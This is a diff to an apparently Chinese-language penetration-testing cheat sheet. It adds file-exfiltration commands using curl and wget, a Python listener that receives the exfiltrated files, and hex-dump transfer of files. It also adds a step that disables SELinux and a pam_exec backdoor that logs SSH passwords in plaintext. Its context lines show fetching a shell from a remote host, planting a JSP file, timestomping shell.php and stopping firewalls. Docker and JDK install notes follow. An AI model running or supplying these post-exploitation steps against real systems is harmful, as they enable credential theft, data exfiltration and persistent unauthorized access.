@@ -60,6 +60,57 @@ wget -P /tmp/ http://x.x.x.x:8080/shell
 curl -o /tmp/xxx http://x.x.x.x:8080/shell
 ```
 
+## curl/wget 发送文件
+
+```bash
+curl -X POST --data-binary @file.txt http://localhost:9000
+
+wget --post-file=file.txt http://localhost:9000
+
+curl -T file.txt http://localhost:9000
+```
+
+```python
+import socket
+
+def start_server(host, port, buffer_size=1024):
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.bind((host, port))
+    server_socket.listen(5)
+    print(f"服务器正在 {host}:{port} 监听...")
+
+    while True:
+        client_socket, addr = server_socket.accept()
+        print(f"连接来自 {addr}")
+
+        # 读取HTTP请求头
+        request = b""
+        while b"\r\n\r\n" not in request:
+            request += client_socket.recv(buffer_size)
+        
+        headers, file_data = request.split(b"\r\n\r\n", 1)
+
+        # 提取文件名（可以根据实际需求修改提取方式）
+        file_name = "received_file"  # 默认文件名
+
+        # 保存文件
+        with open(file_name, 'wb') as f:
+            f.write(file_data)
+            while True:
+                data = client_socket.recv(buffer_size)
+                if not data:
+                    break
+                f.write(data)
+
+        print(f"文件 {file_name} 已保存")
+        client_socket.close()
+
+if __name__ == "__main__":
+    HOST = '0.0.0.0'
+    PORT = 9000
+    start_server(HOST, PORT)
+```
+
 ## 文件时间修改
 
 > 修改 /www/wwwroot/shell.php 时间为 2024.05.16.24
@@ -77,7 +128,11 @@ cat /etc/resolv.conf
 ## 停止防火墙
 
 ```
-systemctl stop firewalld && service iptables stop && ufw disable
+systemctl stop firewalld
+service iptables stop
+
+ubuntu:
+ufw disable
 ```
 
 ## 搜索敏感信息
@@ -98,6 +153,8 @@ echo eHh4ZGFzMQ== | base64 -d > /www/xxx.jsp
 //追加
 echo xxx >> /www/xxx.jsp
 ```
+
+在线编码：https://forum.ywhack.com/coding.php
 
 ## 写入 ssh 公钥：
 
@@ -139,3 +196,112 @@ Linux 合并：
 cat xaa xab > fscan
 ```
 
+## 十六进制获取文件
+
+```
+# 将文件转换为十六进制
+xxd -p filename 
+```
+
+```
+# 本地还原：
+xxd -p -r filename > aa.tar.gz
+```
+
+## pam_exec 抓 SSH 密码
+
+需要关闭 SELinux：
+```
+setenforce 0 # 关闭
+setenforce 1 # 开启
+```
+
+修改 `/etc/pam.d/sshd` 第一行添加：
+
+```
+auth optional pam_exec.so quiet expose_authtok /tmp/sshd.sh
+```
+
+/tmp/sshd.sh:
+
+> `chmod 777 /tmp/sshd.sh`
+
+```bash
+#!/bin/sh
+
+echo "$(date) $PAM_USER $(cat -) $PAM_RHOST $PAM_RUSER" >> /tmp/123.log
+```
+
+
+## Debian/Ubuntu Docker 安装
+
+> Debian 12 / Ubuntu 24.04 安装 Docker 以及 Docker Compose
+
+**安装一些必要的软件包**
+
+```
+apt update
+apt upgrade -y
+apt install curl vim wget gnupg dpkg apt-transport-https lsb-release ca-certificates
+```
+
+**加入 Docker 的 GPG 公钥和 apt 源**
+
+```
+Debian:
+curl -sSL https://download.docker.com/linux/debian/gpg | gpg --dearmor > /usr/share/keyrings/docker-ce.gpg
+echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-ce.gpg] https://download.docker.com/linux/debian $(lsb_release -sc) stable" > /etc/apt/sources.list.d/docker.list
+
+Ubuntu:
+curl -sSL https://download.docker.com/linux/debian/gpg | gpg --dearmor > /usr/share/keyrings/docker-ce.gpg
+echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-ce.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -sc) stable" > /etc/apt/sources.list.d/docker.list
+```
+
+国内机器可以用清华 TUNA 的国内源:
+
+```
+Debian:
+curl -sS https://download.docker.com/linux/debian/gpg | gpg --dearmor > /usr/share/keyrings/docker-ce.gpg
+echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-ce.gpg] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian $(lsb_release -sc) stable" > /etc/apt/sources.list.d/docker.list
+
+Ubuntu:
+curl -sS https://download.docker.com/linux/debian/gpg | gpg --dearmor > /usr/share/keyrings/docker-ce.gpg
+echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-ce.gpg] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/ubuntu $(lsb_release -sc) stable" > /etc/apt/sources.list.d/docker.list
+```
+
+然后更新系统后即可安装 Docker CE 和 Docker Compose 插件
+
+```
+apt update
+apt install docker-ce docker-ce-cli containerd.io docker-compose-plugin
+
+```
+
+**安装 Docker Compose**
+
+```
+curl -L https://github.com/docker/compose/releases/latest/download/docker-compose-Linux-x86_64 > /usr/local/bin/docker-compose
+chmod +x /usr/local/bin/docker-compose
+
+```
+
+## JDK 安装
+
+```
+ubuntu18运行
+sudo apt install openjdk-11-jre-headless
+sudo apt install openjdk-11-jdk
+```
+
+```
+手动
+tar -xzvf jdk-13.0.2_linux-x64_bin.tar.gz
+cd jdk-13.0.2/
+pwd
+vim /etc/profile
+
+export JAVA_HOME=/root/jdk-13.0.2
+export CLASSPATH=$:CLASSPATH:$JAVA_HOME/lib/ export PATH=$PATH:$JAVA_HOME/bin
+
+source /etc/profile
+```
